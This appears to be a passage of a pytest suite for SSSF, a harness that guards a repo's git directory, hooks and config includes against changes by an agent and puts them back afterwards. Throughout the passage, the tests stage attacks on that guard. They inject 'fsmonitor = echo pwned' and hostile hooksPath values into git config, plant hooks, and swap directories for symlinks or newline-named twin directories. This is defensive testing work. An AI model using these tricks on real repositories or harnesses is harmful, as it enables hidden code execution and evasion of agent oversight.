    git(repo, "config", "--global", "--add", "include.path", f"{home}//./lnk/../l3/x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert permissions.restore_git_dir(run, guard) == []
    guard = permissions.guard_git_dir(run)
    link = {"lnk": home / "lnk", "out_l3": out.resolve() / "l3"}[which]
    other = tmp_path / "fresh"
    other.mkdir()
    link.unlink()
    link.symlink_to(other)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


@pytest.mark.parametrize("value", ["{home}/lnk/x.inc", "{home}/lnk/../x.inc"])
def test_the_prefixes_are_walked_in_one_shell_call(repo, home, tmp_path, monkeypatch, value):
    out = _link_out(tmp_path)
    (out / "a" / "x.inc").write_text("")
    (home / "lnk").symlink_to(out / "a")
    git(repo, "config", "--global", "--add", "include.path", value.format(home=home))
    scripts = []
    real = permissions._sh

    def counting(script, *args, **kwargs):
        scripts.append(script)
        return real(script, *args, **kwargs)

    monkeypatch.setattr(permissions, "_sh", counting)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert scripts.count(permissions._WHERE) == 1
    assert scripts.count(permissions._REAL) == 2
    assert str(home / "lnk") in guard["where"]
    assert permissions.restore_git_dir(run, guard) == []


# ── every prefix of a watched path ──

def _hole1(repo, home, tmp_path):
    (home / "d").mkdir()
    (home / "x.inc").write_text("")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/d/../x.inc")


def _hole2(repo, home, tmp_path):
    git(repo, "config", "include.path", "../shared.inc")
    (repo / "shared.inc").write_text("")


def _hole3(repo, home, tmp_path):
    out = _link_out(tmp_path)
    (home / "lnk").symlink_to(out / "a")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/lnk/../x.inc")


def _swap_d(home, tmp_path):
    evil = _evil(tmp_path)
    (home / "d").rmdir()
    (home / "d").symlink_to(evil / "a")
    return evil


def test_a_real_dir_before_dotdot_swapped_for_a_link_is_seen(repo, home, tmp_path):
    _hole1(repo, home, tmp_path)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    evil = _swap_d(home, tmp_path)
    assert "pwned" in git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert str(home / "d") in str(caught.value)
    assert os.readlink(home / "d") == str(evil / "a")
    assert (evil / "x.inc").read_text() == FSMONITOR
    assert (home / "x.inc").read_text() == ""


def test_a_moved_dot_git_with_a_relative_include_is_seen(repo, home, tmp_path):
    _hole2(repo, home, tmp_path)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evil"
    evil.mkdir()
    (repo / ".git").rename(evil / "g")
    (repo / ".git").symlink_to(evil / "g")
    (evil / "shared.inc").write_text(FSMONITOR)
    assert "pwned" in git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert ".git" in str(caught.value)
    assert os.readlink(repo / ".git") == str(evil / "g")
    assert (repo / "shared.inc").read_text() == ""
    assert sorted(p.name for p in evil.iterdir()) == ["g", "shared.inc"]


def test_a_dir_a_link_points_at_swapped_for_a_link_is_seen(repo, home, tmp_path):
    _hole3(repo, home, tmp_path)
    out = tmp_path / "out"
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    (out / "a").rmdir()
    evil = _evil(tmp_path)
    (out / "a").symlink_to(evil / "a")
    assert "pwned" in git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert str(home / "lnk") in str(caught.value)
    assert os.readlink(out / "a") == str(evil / "a")
    assert (out / "x.inc").read_text() == ""


def test_a_missing_dir_created_as_a_real_dir_is_still_put_back(repo, home, tmp_path):
    if tmp_path.resolve() != tmp_path:
        pytest.skip("needs a physical tmp_path")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    (home / ".config" / "git").mkdir(parents=True)
    (home / ".config" / "git" / "config").write_text(FSMONITOR)
    with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
        permissions.restore_git_dir(run, guard)
    assert not (home / ".config" / "git" / "config").exists()


def test_a_removed_real_dir_on_the_way_is_put_back(repo, home, tmp_path):
    (home / "d").mkdir()
    (home / "d" / "x.inc").write_text("")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/d/x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    shutil.rmtree(home / "d")
    with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
        permissions.restore_git_dir(run, guard)
    assert (home / "d" / "x.inc").read_text() == ""


def test_a_removed_link_on_the_way_is_still_reported(repo, home, tmp_path):
    _hole3(repo, home, tmp_path)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    (home / "lnk").unlink()
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert str(home / "lnk") in str(caught.value)


@pytest.mark.parametrize("setup", [_hole1, _hole2, _hole3])
def test_unchanged_prefixes_change_nothing(repo, home, tmp_path, setup):
    setup(repo, home, tmp_path)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert permissions.restore_git_dir(run, guard) == []


def test_a_real_dir_swapped_for_a_dangling_link_writes_nothing_through_it(repo, home, tmp_path):
    (home / "d").mkdir()
    (home / "d" / "x.inc").write_text("[user]\n")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/d/x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    shutil.rmtree(home / "d")
    (home / "d").symlink_to(tmp_path / "evil" / "a")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert str(home / "d") in str(caught.value)
    assert os.readlink(home / "d") == str(tmp_path / "evil" / "a")
    assert not (tmp_path / "evil").exists()


# ── a prefix that no longer resolves ──

@pytest.mark.parametrize("how", ["removed", "file", "locked"])
def test_a_dir_before_dotdot_that_no_longer_resolves_is_seen(repo, home, tmp_path, how):
    if how == "locked" and os.geteuid() == 0:
        pytest.skip("root can enter a mode 0 directory")
    _hole1(repo, home, tmp_path)
    (home / "x.inc").write_text("[core]\n\thooksPath = /dev/null\n")
    assert git(repo, "config", "core.hooksPath") == "/dev/null"
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    try:
        if how == "locked":
            (home / "d").chmod(0)
        else:
            (home / "d").rmdir()
            if how == "file":
                (home / "d").write_text("agent\n")
            assert "hookspath=/dev/null" not in git(repo, "config", "--list").lower()
        assert permissions.git_dir_changed(guard)
        with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
            permissions.restore_git_dir(run, guard)
        assert f"  - {home / 'd'}" in str(caught.value).splitlines()
        if how == "removed":
            assert not (home / "d").exists()
        if how == "file":
            assert (home / "d").read_text() == "agent\n"
        assert (home / "x.inc").read_text() == "[core]\n\thooksPath = /dev/null\n"
    finally:
        if how == "locked":
            (home / "d").chmod(0o755)


def test_a_removed_empty_dir_on_the_way_stops_the_run(repo, home, tmp_path):
    (home / ".config").mkdir()
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    (home / ".config").rmdir()
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert f"  - {home / '.config'}" in str(caught.value).splitlines()
    assert not (home / ".config").exists()


def test_a_removed_hooks_dir_is_put_back(repo, home, tmp_path):
    (repo / ".git" / "hooks" / "keep").write_text("")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    shutil.rmtree(repo / ".git" / "hooks")
    with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
        permissions.restore_git_dir(run, guard)
    assert (repo / ".git" / "hooks" / "keep").exists()


def test_a_prefix_that_never_resolved_is_not_compared(repo, home, tmp_path):
    assert not (home / ".config").exists()
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    (home / ".config").write_text("agent\n")
    assert permissions.restore_git_dir(run, guard) == []


def test_moved_without_gone_matches_the_baseline_roots(repo, home, tmp_path):
    _hole1(repo, home, tmp_path)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    (home / "d").rmdir()
    assert str(home / "d") in permissions._moved(guard)
    assert str(home / "d") not in permissions._moved(guard, gone=False)


def test_a_hooks_dir_swapped_for_a_link_is_still_put_back(repo, home, tmp_path):
    plant_hook(tmp_path / "evilhooks")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    shutil.rmtree(repo / ".git" / "hooks")
    (repo / ".git" / "hooks").symlink_to(tmp_path / "evilhooks")
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    assert not (repo / ".git" / "hooks").is_symlink()
    assert commit_runs_no_hook(repo)


def _twin(path: Path) -> Path:
    """A directory named like `path` plus a trailing newline."""
    twin = Path(str(path) + "\n")
    twin.mkdir(parents=True)
    return twin


def test_a_link_retargeted_to_a_newline_twin_dir_is_seen(repo, home, tmp_path):
    store = tmp_path / "store"
    (store / "dots").mkdir(parents=True)
    (store / "dots" / "x.inc").write_text("")
    (home / "dots").symlink_to(store / "dots")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/dots/x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    twin = _twin(store / "dots")
    (twin / "x.inc").write_text(FSMONITOR)
    (home / "dots").unlink()
    (home / "dots").symlink_to(twin)
    assert "pwned" in git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    assert (twin / "x.inc").read_text() == FSMONITOR


def test_a_home_link_retargeted_to_a_newline_twin_is_seen(repo, tmp_path, monkeypatch):
    real = tmp_path / "realhome"
    real.mkdir()
    (real / ".gitconfig").write_text("[user]\n\tname = t\n")
    link = tmp_path / "linkhome"
    link.symlink_to(real)
    monkeypatch.setenv("HOME", str(link))
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    twin = _twin(real)
    (twin / ".gitconfig").write_text(FSMONITOR)
    link.unlink()
    link.symlink_to(twin)
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    assert (twin / ".gitconfig").read_text() == FSMONITOR


def test_a_dot_git_link_retargeted_to_a_newline_twin_is_seen(repo, tmp_path):
    store = tmp_path / "store"
    store.mkdir()
    (repo / ".git").rename(store / "g")
    (repo / ".git").symlink_to(store / "g")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    twin = tmp_path / "store" / "g\n"
    shutil.copytree(store / "g", twin)
    with open(twin / "config", "a") as f:
        f.write("[core]\n\tfsmonitor = echo pwned\n")
    (repo / ".git").unlink()
    (repo / ".git").symlink_to(twin)
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    assert os.readlink(repo / ".git") == str(twin)


def test_nothing_is_deleted_through_a_link_to_a_newline_twin(repo, home, tmp_path):
    store = tmp_path / "store"
    (store / "dots").mkdir(parents=True)
    (store / "dots" / "x.inc").write_text("")
    (home / "dots").symlink_to(store / "dots")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/dots/x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    twin = _twin(store / "dots")
    (twin / "x.inc").write_text("[user]\n")
    shutil.rmtree(store / "dots")
    (store / "dots").symlink_to(twin)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    assert (twin / "x.inc").read_text() == "[user]\n"


def test_a_moved_dotdot_prefix_still_puts_back_the_gitconfig(repo, home, tmp_path):
    (home / "d").mkdir()
    (home / "x.inc").write_text("")
    (home / ".gitconfig").write_text(f"[include]\n\tpath = {home}/d/../x.inc\n")
    before = (home / ".gitconfig").read_text()
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    evil = _swap_d(home, tmp_path)
    with open(home / ".gitconfig", "a") as f:
        f.write(FSMONITOR)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert str(home / "d") in str(caught.value)
    assert ".gitconfig" in str(caught.value)
    assert (home / ".gitconfig").read_text() == before
    assert os.readlink(home / "d") == str(evil / "a")


def test_a_retargeted_home_link_still_puts_back_the_physical_gitconfig(repo, tmp_path, monkeypatch):
    real = tmp_path / "realhome"
    real.mkdir()
    (real / ".gitconfig").write_text("[user]\n\tname = t\n")
    link = tmp_path / "linkhome"
    link.symlink_to(real)
    monkeypatch.setenv("HOME", str(link))
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evilhome"
    evil.mkdir()
    (evil / ".gitconfig").write_text("[core]\n\thooksPath = /evil\n")
    with open(real / ".gitconfig", "a") as f:
        f.write(FSMONITOR)
    link.unlink()
    link.symlink_to(evil)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    assert (real / ".gitconfig").read_text() == "[user]\n\tname = t\n"
    assert os.readlink(link) == str(evil)
    assert (evil / ".gitconfig").read_text() == "[core]\n\thooksPath = /evil\n"


# ── a git config git can't read ──


def test_a_symlink_loop_in_an_include_stops_the_run_first(repo, home):
    include = f"{repo}/loop/x.inc"
    git(repo, "config", "--add", "include.path", include)
    before = state(repo)
    saved = (home / ".gitconfig").read_text()
    (repo / "loop").symlink_to("loop")
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(shipped(repo))
    text = str(caught.value)
    for part in ("couldn't read the repo's git config", "Too many levels of symbolic links",
                 include[:100], include[-30:], "did not run", "run again"):
        assert part in text
    if len(include) <= 200:
        assert include in text
    assert state(repo) == before
    assert (home / ".gitconfig").read_text() == saved
    assert os.path.islink(repo / "loop")
    (repo / "loop").unlink()
    guard = permissions.guard_git_dir(shipped(repo))
    assert f"{repo}/.git/hooks" in guard["paths"]


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores search permission")
def test_an_unsearchable_dir_before_dotdot_stops_the_run_first(repo, tmp_path):
    out = _dotdot_setup(repo, tmp_path)
    git(repo, "config", "--add", "include.path", f"{repo}/lnk/../x.inc")
    (out / "x.inc").write_text("")
    os.chmod(out / "a", 0o600)
    try:
        with pytest.raises(permissions.PermissionBreach) as caught:
            permissions.guard_git_dir(shipped(repo))
        assert "couldn't read the repo's git config" in str(caught.value)
        assert "Permission denied" in str(caught.value)
        assert stat.S_IMODE((out / "a").stat().st_mode) == 0o600
        assert (out / "x.inc").read_text() == ""
    finally:
        os.chmod(out / "a", 0o755)


def test_a_dot_git_git_cannot_read_stops_the_run(tmp_path):
    root = tmp_path / "r"
    root.mkdir()
    (root / ".git").write_text("gitdir: /nonexistent/sssf-missing\n")
    os.environ.pop("GIT_DIR", None)
    with pytest.raises(permissions.PermissionBreach, match="couldn't read the repo's git config"):
        permissions.guard_git_dir(shipped(root))


def test_a_broken_global_config_outside_a_repo_stops_the_run(tmp_path, home):
    (home / ".gitconfig").write_text(f"[include]\n\tpath = {tmp_path}/gloop/x.inc\n")
    (tmp_path / "gloop").symlink_to("gloop")
    nr = tmp_path / "nr"
    nr.mkdir()
    os.environ.pop("GIT_DIR", None)
    with pytest.raises(permissions.PermissionBreach, match="Too many levels of symbolic links"):
        permissions.guard_git_dir(shipped(nr))


def test_outside_a_repo_in_another_locale_is_still_nothing_to_guard(tmp_path, monkeypatch):
    plain = tmp_path / "plain"
    plain.mkdir()
    monkeypatch.setenv("LC_ALL", "fr_FR.UTF-8")
    monkeypatch.setenv("LANGUAGE", "fr")
    monkeypatch.delenv("GIT_DIR", raising=False)
    box = permissions.sandbox.current()
    original = box.run
    seen = []

    def spy(command, *args, **kwargs):
        seen.append(list(command))
        return original(command, *args, **kwargs)

    monkeypatch.setattr(box, "run", spy)
    assert permissions.guard_git_dir(shipped(plain)) is None
    probes = [c for c in seen if "--git-common-dir" in c]
    assert probes and all(c[:3] == ["env", "LC_ALL=C", "git"] for c in probes)


def test_a_readable_repo_runs_no_extra_command(repo, monkeypatch):
    scripts = []
    real = permissions._sh

    def counting(script, *args, **kwargs):
        scripts.append(script)
        return real(script, *args, **kwargs)

    monkeypatch.setattr(permissions, "_sh", counting)
    assert permissions.guard_git_dir(shipped(repo))
    assert '[ -e "$1" ] || [ -L "$1" ]' not in scripts


# ── a directory pwd -P can't name ──

class Unnameable:
    def __init__(self, base: Path):
        self.base = base
        self.n = "a" * 200
        self.inc = f"{base}/A/B/x.inc"
        self.physical = f"{base}/long/" + "/".join([self.n] * 22) + "/x.inc"

    def lock(self):
        os.chmod(self.base / "long", 0o311)

    def unlock(self):
        os.chmod(self.base / "long", 0o755)


@pytest.fixture
def unnameable(tmp_path):
    if os.geteuid() == 0:
        pytest.skip("root can read through mode 311 directories")
    u = Unnameable(Path(os.path.realpath(tmp_path)))
    n = u.n
    (u.base / "long").mkdir()
    fd = os.open(u.base / "long", os.O_RDONLY | os.O_DIRECTORY)
    fd11 = None
    try:
        for i in range(22):
            os.mkdir(n, dir_fd=fd)
            nxt = os.open(n, os.O_RDONLY | os.O_DIRECTORY, dir_fd=fd)
            os.close(fd)
            fd = nxt
            if i == 10:
                fd11 = os.dup(fd)
        out = os.open("x.inc", os.O_WRONLY | os.O_CREAT, 0o644, dir_fd=fd)
        os.write(out, b"[user]\n\tname = t\n")
        os.close(out)
        os.symlink("long/" + "/".join([n] * 11), u.base / "A")
        os.symlink("/".join([n] * 11), "B", dir_fd=fd11)
    finally:
        os.close(fd)
        if fd11 is not None:
            os.close(fd11)
    try:
        yield u
    finally:
        u.unlock()


def require_unnameable(u: Unnameable) -> None:
    out = permissions._sh('cd -P "$1" && pwd -P', f"{u.base}/A/B").stdout
    if out.startswith("/"):
        pytest.skip("this filesystem can still name the path")


@pytest.mark.parametrize("fake", ["pwd() { return 1; }", "pwd() { echo; }", "pwd() { echo rel; }"])
def test_a_failed_pwd_reads_as_not_resolving(tmp_path, fake):
    d = tmp_path / "d"
    d.mkdir()
    real = permissions._sh(fake + "\n" + permissions._REAL, f"{d}/x", f"{tmp_path}/missing/x").stdout
    assert real.split("\0")[:2] == ["?", ""]
    where = permissions._sh(fake + "\n" + permissions._WHERE, f"{d}/x").stdout.split("\0")
    where.pop()
    assert where[1::3] and all(f == "" for f in where[1::3])
    control = permissions._sh(permissions._REAL, f"{d}/x").stdout.split("\0")[0]
    assert control == f"{os.path.realpath(d)}/x"


def _real(path: str) -> str:
    return permissions._sh(permissions._REAL, path).stdout.split("\0")[0]


def test_real_of_an_unnameable_dir_is_marked(unnameable):
    u = unnameable
    u.lock()
    require_unnameable(u)
    assert _real(u.inc) == "?"
    where = permissions._where([u.inc])
    assert where[f"{u.base}/A/B"][0] == ""
    assert where[f"{u.base}/A"][0].startswith("/")
    u.unlock()
    assert _real(u.inc) == u.physical


def test_an_include_under_an_unnameable_dir_is_watched_and_caught(repo, unnameable):
    u = unnameable
    u.lock()
    require_unnameable(u)
    git(repo, "config", "--add", "include.path", u.inc)
    guard = permissions.guard_git_dir(shipped(repo))
    assert "/x.inc" not in guard["paths"]
    assert u.inc in guard["paths"]
    git(repo, "config", "-f", u.inc, "core.hooksPath", str(repo / "evil"))
    ino = os.stat(u.inc).st_ino
    data = Path(u.inc).read_bytes()
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as err:
        permissions.restore_git_dir(SimpleNamespace(repo_root=repo), guard)
    assert u.inc in str(err.value)
    assert os.stat(u.inc).st_ino == ino
    assert Path(u.inc).read_bytes() == data


def test_a_dotdot_include_under_an_unnameable_dir_stops_the_run_first(repo, unnameable):
    u = unnameable
    u.lock()
    require_unnameable(u)
    value = f"{u.base}/A/B/../B/x.inc"
    git(repo, "config", "--add", "include.path", value)
    before = state(repo)
    with pytest.raises(permissions.PermissionBreach) as err:
        permissions.guard_git_dir(shipped(repo))
    msg = str(err.value)
    for part in ("include.path", value, "did not run", "without `..`", "whose real path can't be read"):
        assert part in msg
    assert state(repo) == before


def test_a_prefix_that_becomes_unnameable_has_moved(unnameable):
    u = unnameable
    walked = [u.inc]
    guard = {"walked": walked, "where": permissions._where(walked)}
    assert guard["where"][f"{u.base}/A/B"][0].startswith("/")
    u.lock()
    require_unnameable(u)
    assert f"{u.base}/A/B" in permissions._moved(guard)
    assert f"{u.base}/A/B" in permissions._moved(guard, gone=False)


# ── a hooks directory git can't name ──


def _hooks_unnameable(repo: Path) -> None:
    done = subprocess.run(["git", "rev-parse", "--path-format=absolute", "--git-path", "hooks"],
                          cwd=repo, capture_output=True)
    if done.returncode == 0:
        pytest.skip("git can still name this hooks path here")


def test_a_hooks_path_git_cannot_name_stops_the_run_first(repo, home, unnameable):
    hooks = f"{unnameable.base}/A/B/hooks"
    git(repo, "config", "core.hooksPath", hooks)
    _hooks_unnameable(repo)
    before = state(repo)
    saved = (home / ".gitconfig").read_text()
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(shipped(repo))
    msg = str(caught.value)
    for word in ("couldn't name the hooks directory", "Invalid path", "core.hooksPath",
                 "shorter path", "did not run", "run again"):
        assert word in msg
    assert all(len(l) <= 302 for l in msg.splitlines())
    assert state(repo) == before
    assert (home / ".gitconfig").read_text() == saved
    assert not os.path.lexists(f"{unnameable.physical.rsplit('/', 1)[0]}/hooks")


def test_a_hooks_path_git_can_name_again_is_watched(repo, unnameable):
    git(repo, "config", "core.hooksPath", f"{unnameable.base}/A/B/hooks")
    _hooks_unnameable(repo)
    with pytest.raises(permissions.PermissionBreach):
        permissions.guard_git_dir(shipped(repo))
    git(repo, "config", "core.hooksPath", f"{unnameable.base}/A")
    guard = permissions.guard_git_dir(shipped(repo))
    assert os.path.realpath(f"{unnameable.base}/A") in guard["paths"]
    assert permissions.restore_git_dir(SimpleNamespace(repo_root=repo), guard) == []


@pytest.mark.parametrize("err", [b"fatal: boom\n", b""])
def test_a_failed_hooks_rev_parse_stops_the_run(repo, monkeypatch, err):
    box = permissions.sandbox.current()
    real = box.run

    def spy(command, *a, **k):
        if "--git-path" in command and "hooks" in command:
            return subprocess.CompletedProcess(command, 128, b"", err)
        return real(command, *a, **k)

    monkeypatch.setattr(box, "run", spy)
    before = state(repo)
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(shipped(repo))
    msg = str(caught.value)
    assert "couldn't name the hooks directory" in msg
    assert "fatal: boom" in msg or "(git printed no error; exit code 128)" in msg
    assert state(repo) == before


def test_said_quotes_a_line_within_the_limit_as_is():
    assert permissions._said("f" * 300, 1) == "  " + "f" * 300


def test_said_keeps_both_ends_of_a_long_line():
    err = "fatal: unable to access '/" + "d" * 400 + "': Too many levels of symbolic links\n"
    out = permissions._said(err, 128)
    assert out == "  " + err.strip()[:149] + "[…]" + err.strip()[-148:]
    assert len(out) == 2 + 300


def test_said_shows_non_printables_at_both_ends_of_a_cut_line():
    assert permissions._said("\x1b" + "a" * 400 + "\x07", 1) == (
        "  ?" + "a" * 148 + "[…]" + "a" * 147 + "?")


def test_said_keeps_at_most_twenty_lines():
    lines = permissions._said("\n".join(f"line {i}" for i in range(25)), 1).splitlines()
    assert len(lines) == 20
    assert lines[-1] == "  line 19"


def test_unreadable_keeps_its_message():
    assert permissions._unreadable("fatal: x\n", 128) == (
        "git couldn't read the repo's git config, so SSSF can't tell which git "
        "files to watch. The agent did not run, and no run will until git can "
        "read it. git said:\n  fatal: x\n\n"
        "Fix the config file or include path git names above, for example a "
        "symlink loop or a directory git can't enter, then run again.")


def test_the_envelope_write_replaces_a_link_an_agent_left(tmp_path):
    cfg = agents.load_config(str(SKILL / "templates" / "sssf.config.yaml"))
    name = cfg.agents[0].name
    session = tmp_path / "sessions" / "abcd1234"
    (session / name).mkdir(parents=True)
    victim = tmp_path / "victim.txt"
    victim.write_text("keep")
    (session / name / "envelope.json").symlink_to(victim)
    run = SimpleNamespace(cfg=cfg, data_root=tmp_path, session_dir=session,
                          tracer=SimpleNamespace(envelope_row=lambda *a, **k: None))
    agents._persist_envelope(run, None, name, AgentCall(output_type=PlanOutput, prompt="p"),
                             PlanOutput(status="success"), 1, True)
    assert victim.read_text() == "keep"
    assert not (session / name / "envelope.json").is_symlink()
    assert '"status": "success"' in (session / name / "envelope.json").read_text()
